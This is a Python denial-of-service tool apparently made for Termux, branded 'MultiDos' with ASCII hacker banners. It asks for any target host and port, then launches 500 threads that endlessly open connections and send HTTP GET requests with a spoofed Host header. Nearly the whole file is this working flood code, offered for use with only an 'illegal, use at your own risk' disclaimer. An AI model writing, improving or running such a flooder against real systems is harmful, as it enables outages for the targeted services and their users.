#!/bin/python
# Author : Bishal Singh ~Alienkrishn
import socket,threading,os.path,random,itertools,time,sys
os.system("clear")
attack_num=0

a="""\a\n\33[31;1m
              ,-.
        / \\ `. __..-,O
       : \\ --''_..-'.'
       | . .-' `. '.
       : . .`.'
        \\ `. / ..
         \\ `. ' .
          `, `. \\
         ,|,`. `-.\\
        '.|| ``-...__..-`
         | |
         |__|
         /||\\
        //||\\\\
       // || \\\\
    __//__||__\\\\__
\33[0m<----------\33[36;1m[\33[32;@TERMUX-TÜRKİYE(\33[36;1m]\33[0m------------>

[1] DoS attack fast
[2] DoS Attack Informative
[0] EXIT

"""
def androdos():

  target = input("Enter Target: ")
  fake_ip = "182.21.20.32"
  port =int(input("Enter port: "))

  print("Attack started target will down soon !")

  def attack():
    while True:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
      s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
      s.close()

  for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
def infodos():
  target = input("Enter Target: ")
  fake_ip = "182.21.20.32"
  port =int(input("Enter port: "))
  print("\33[32;1mattack starting soon, this will slow donw the attack!")
  time.sleep(3)
  def attack():
     while True:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
      s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
      global attack_num
      attack_num += 1
      print(attack_num," attack sent to = ",target)
      s.close()

  for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

b="""\a\n\33[32;1m
                      ,-.
        / \\ `. __..-,O
       : \\ --''_..-'.'
       | . .-' `. '.
       : . .`.'
        \\ `. / ..
         \\ `. ' .
          `, `. \\
         ,|,`. `-.\\
        '.|| ``-...__..-`
         | |
         |__|
         /||\\
        //||\\\\
       // || \\\\
    __//__||__\\\\__
 \33[31;1m\33[4m[DDoS is Illegal use it at your own risk]
\33[0m
[1] DoS attack fast
[2] DoS Attack Informative
[0] EXIT

 """

e="""\a\n\33[34;1m                                                                          
                     ,-.
        / \\ `. __..-,O
       : \\ --''_..-'.'
       | . .-' `. '.
       : . .`.'
        \\ `. / ..
         \\ `. ' .
          `, `. \\
         ,|,`. `-.\\
        '.|| ``-...__..-`
         | |
         |__|
         /||\\
        //||\\\\
       // || \\\\
    __//__||__\\\\__
   "$$$$$"      \33[31;1m @TEMUX-TÜRKİYE \33[34;1m     ""$$$$""
     $$$" \33[35mMultiDos By Alienkrishn \33[34;1m$$$$"

 \33[31;1m\33[4m[DDoS is Illegal use it at your own risk]
\33[0m
No technology that's connected to the Internet is unhackable. ...

[1] DoS attack fast
[2] DoS Attack Informative
[0] EXIT

 """

c="""\a\n

               ,-.
        / \\ `. __..-,O
       : \\ --''_..-'.'
       | . .-' `. '.
       : . .`.'
        \\ `. / ..
         \\ `. ' .
          `, `. \\
         ,|,`. `-.\\
        '.|| ``-...__..-`
         | |
         |__|
         /||\\
        //||\\\\
       // || \\\\
    __//__||__\\\\__

\33[32;1mWith great power comes great responsibility
\33[31;1mDon't missuse your talent ! \33[0m

[1] DoS attack fast
[2] DoS Attack Informative
[0] EXIT
\33[0m
"""
d="""\a\n\33[33;1m
           ,-.
        / \\ `. __..-,O
       : \\ --''_..-'.'
       | . .-' `. '.
       : . .`.'
        \\ `. / ..
         \\ `. ' .
          `, `. \\
         ,|,`. `-.\\
        '.|| ``-...__..-`
         | |
         |__|
         /||\\
        //||\\\\
       // || \\\\
    __//__||__\\\\__
    
\33[0m<----------\33[36;1m[\33[32;1mfastddos by @TERMUX-TÜRKİYE\33[36;1m]\33[0m------------>

Amateurs hack systems, professionals hack people

[1] DoS attack fast
[2] DoS Attack Informative
[0] EXIT

"""

stop=False

def muter():

    for c in itertools.cycle(['- ','\ ','| ','/ ']):
        if stop:
            break
        sys.stdout.write("\r\033[1;32m[+]\033[1;31m Exiting\033[1;37m....." + c)
        sys.stdout.flush()
        time.sleep(0.04)
    sys.stdout.write("\r\033[1;32m[+] \033[1;35mThanks for using this tool, Byeee ...\n")
t = threading.Thread(target=muter)

def logo():
    anon = [a,b,c,d,e]
    m = "".join(random.sample(anon,1))
    os.system("clear")
    print(m)
logo()


k = input("\033[1;32m[*]\033[1;31m Choose\033[1;32m :\033[1;36m")

if k == '0' or k == '00':
  t.start()
  time.sleep(1)
  stop = True
  os.system("cd")
  sys.exit(0)


elif k=='1':
  androdos()

elif k=="2":
  infodos()
else:
  os.system("fastddos")